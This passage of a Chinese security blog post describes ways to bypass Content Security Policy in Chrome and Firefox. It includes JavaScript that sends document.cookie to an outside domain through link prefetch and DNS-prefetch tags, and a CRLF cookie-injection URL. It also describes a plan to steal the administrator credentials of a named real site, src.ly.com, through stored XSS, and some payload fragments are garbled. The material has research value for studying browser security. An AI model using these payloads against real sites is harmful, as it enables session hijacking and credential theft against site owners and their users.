  * 含恶意软件的页面
  * URL 中包含下载资源
  * 页面中包含音频、视频
  * POST、PUT 和 DELETE 操作的 ajax 请求
  * HTTP 认证(Authentication) / HTTPS 页面
  * 正在运行 Chrome developer tools 开发工具
#### 0x04 Bypass Chrome CSP
在 Chrome 中，CSP 的规范执行是较低于 Firefox 的（0x05会提到），我们来看下面这条规则：
    Content-Security-Policy: default-src 'self'; script-src 'self' test.n0tr00t.com 'unsafe-inline';
默认同源下的资源加载，允许内部标签执行但只能数据传输给同源和 test.n0tr00t.com 域下，一般情况下我们可以通过入侵
test.n0tr00t.com
域名来将信息传输出去，除此之外，如果是交互性较强的平台，我们也可以不将数据对外传输，例如：
由于 inline 的存在，我们可以内嵌代码到页面中对社区进行蠕虫等操作，但由于开始提到 Chrome CSP 中的规范执行是较低于 Firefox
的，所以我们可以使用前面提到的多个属性来进行绕过获取信息。
    var n0t = document.createElement("link");
    n0t.setAttribute("rel", "prefetch");
    n0t.setAttribute("href", "//n0tr00t.com/?" + document.cookie);
    document.head.appendChild(n0t);
页面渲染完毕会创建 Link REL=prefetch 的标签，发目标页面发起预加载，我们也可以使用其他属性（2016.02 Fuzz 部分结果）：
  * Prefetch
  * Prerender
  * Preload
  * …
E.g SourceCode :
            csp header test
PageRequestResult :
#### 0x05 Bypass Firefox CSP
如果我们使用前面的 Prefetch 等标签在 Firefox 上是肯定传输不出去数据的，因为 Firefox 浏览器有着较高的 CSP
规范执行，所以我们可以使用其他属性来对 Firefox 上 CSP 进行绕过，虽然这些属性也已经申请加入规范，但目前仍可利用，下面来看目前
src.ly.com 的 CSP 规则：
    content-security-policy:
    default-src *; script-src 'self' bi-collector.oneapm.com *.ly.com hm.baidu.com sec-pic-ly.b0.upaiyun.com  img1.40017.cn captcha.guard.qcloud.com  'unsafe-inline' 'unsafe-eval'; style-src 'self' *.ly.com sec-pic-ly.b0.upaiyun.com *.guard.qcloud.com 'unsafe-inline'; img-src 'self' sec-pic-ly.b0.upaiyun.com  hm.baidu.com  https://static.wooyun.org http://static.wooyun.org *.guard.qcloud.com  data: ; media-src 'self' *.ly.com *.40017.cn;font-src 'self' sec-pic-ly.b0.upaiyun.com data:
  1. script-src 'self' bi-collector.oneapm.com *.ly.com hm.baidu.com sec-pic-ly.b0.upaiyun.com img1.40017.cn captcha.guard.qcloud.com 'unsafe-inline' 'unsafe-eval'; 
  2. style-src 'self' _.ly.com sec-pic-ly.b0.upaiyun.com_.guard.qcloud.com 'unsafe-inline'; 
  3. img-src 'self' sec-pic-ly.b0.upaiyun.com hm.baidu.com https://static.wooyun.org http://static.wooyun.org *.guard.qcloud.com data: ;
  4. media-src 'self' _.ly.com_.40017.cn;
  5. font-src 'self' sec-pic-ly.b0.upaiyun.com data:;
我们的目标是 src.ly.com 的管理员登录凭证，通过细看上面的 CSP 规则我们可以发现存在很多问题，例如 *.40017.cn, unsafe-inline, unsafe-eval, static.wooyun.org 等多个不可控的”信任“外部源。现在我们拥有平台存储型跨站，但由于没有像之前
Dota 社区的用户交互性（我们的目的也不是蠕虫），当然你可以通过获取 Document.cookie
并使用站内私信功能发送给你，然后达到目标，只不过听起来不是那么可靠。
script 的规则满足我们的条件，我们可以使用多个方法来绕过限制创建标签偷取数据：
  * Preconnect
  * DNS-Prefetch
  * …
Payload:
        dc  = document.cookie;
        dcl = dc.split(";");
        n0 = document.getElementsByTagName("HEAD")[0];
        for (var i=0; i";
        }
收取获得 DNS 查询记录：
#### 0x06 END
还有一些伪绕过的 CASE，例如 CRLF （回车 + 换行 \r\n 的简称，在HTTP协议中，HTTP Header 与 HTTP Body 是用两个
CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显示出来。），因为大部分浏览器是根据最后一次出现的同名头来设置的。
E.g:
    http://www.n0tr00t.com/%0d%0aSet-cookie:ID%3Dabcdefg
整篇文章写到并列出的一些 CASE 是我今年初（16） Fuzz 到的，前两天 Patrick Vananti 把 DNS
预解析的发出后，便想把之前的笔记进行简单整理并公布，其中还有一些未列出的属性和方法，欢迎研究：）
#### 0x07 文献参考
  * [0] : https://w3c.github.io/webappsec-csp/
  * [1] : http://caniuse.com/#feat=contentsecuritypolicy
  * [2] : https://content-security-policy.com/
  * [3] : https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ
  * [4] : https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/Y_2eFRh9BOs/gULYapoRBwAJ
  * [5] : https://w3c.github.io/preload/
  * [6] : https://w3c.github.io/web-performance/specs/ResourcePriorities/Overview.html
  * [7] : http://bubkoo.com/2015/11/19/prefetching-preloading-prebrowsing/
  * [8] : http://www.cnblogs.com/suyuwen1/p/5506397.html
  * [9] : http://blog.shaochuancs.com/w3c-html5-link/
**10.28Update**
（利用 sourcemap [firefox, chrome]）：【document.write(``)】via
长短短
* * *